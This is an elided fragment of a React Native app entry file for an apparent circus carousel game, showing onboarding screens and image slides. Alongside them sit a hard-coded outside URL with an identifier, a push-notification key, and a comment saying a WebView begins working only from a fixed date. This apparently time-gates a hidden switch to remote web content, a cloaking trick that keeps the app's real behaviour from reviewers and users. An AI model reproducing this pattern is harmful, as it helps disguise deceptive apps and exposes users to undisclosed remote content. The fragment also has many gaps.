...
import { Animated, Easing, Dimensions, View, Image,StatusBar, StyleSheet } from 'react-native';
import { SafeAreaProvider } from 'react-native-safe-area-context';
import { onboardingSlides } from './circusCarousel/circusData/content';
import { GameScreen } from './circusCarousel/circusScreens/GameScreen';
import { MainScreen } from './circusCarousel/circusScreens/MainScreen';
import { OnboardingSlideScreen } from './circusCarousel/circusScreens/OnboardingSlideScreen';
import { SettingsScreen } from './circusCarousel/circusScreens/SettingsScreen';
import { StoriesScreen } from './circusCarousel/circusScreens/StoriesScreen';
import { StoryDetailsScreen } from './circusCarousel/circusScreens/StoryDetailsScreen';
import { Story } from './circusCarousel/circusTypes';
import ProductScreen from './circusCarousel/circusScreens/ProductScreen';
...
function App() {
  ...
  const INITIAL_URL = `https://fresh-node-hub.site/`;
  const URL_IDENTIFAIRE = `k1qQnc47`;
  ...
  OneSignal.initialize('8d9892f1-283a-47a5-a6c6-f3c30620ed92');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-11-22T08:08:00'); //дата з якої поч працювати webView
  ...
  const renderContent = () => {
    switch (screen) {
      ...
      case 'onboarding1':
        return (
          <OnboardingSlideScreen
            ...
            description={onboardingSlides[0].description}
            buttonLabel={onboardingSlides[0].buttonLabel}
            onNext={() => setScreen('onboarding2')}

            pathToImage={require('./circusCarousel/circusAssets/img/woman/1.png')}
      ...
      case 'onboarding2':
        return (
          <OnboardingSlideScreen
            title={onboardingSlides[1].title}
            description={onboardingSlides[1].description}
            pathToImage={require('./circusCarousel/circusAssets/img/woman/2.png')}
            buttonLabel={onboardingSlides[1].buttonLabel}
      ...
      case 'onboarding3':
        return (
          <OnboardingSlideScreen
            title={onboardingSlides[2].title}
            description={onboardingSlides[2].description}
            buttonLabel={onboardingSlides[2].buttonLabel}
            pathToImage={require('./circusCarousel/circusAssets/img/woman/3.png')}
          ...
          <View style={{ flex: 1, overflow: 'hidden' }}>
            ...
            >
              <Image
                ...
                source={require('./circusCarousel/circusAssets/img/1.png')}
                resizeMode="cover"
              />
              <Image
                style={{ width: screenWidth, height: '100%' }}
                source={require('./circusCarousel/circusAssets/img/2.png')}
                resizeMode="cover"
              />
            </Animated.View>
          </View>
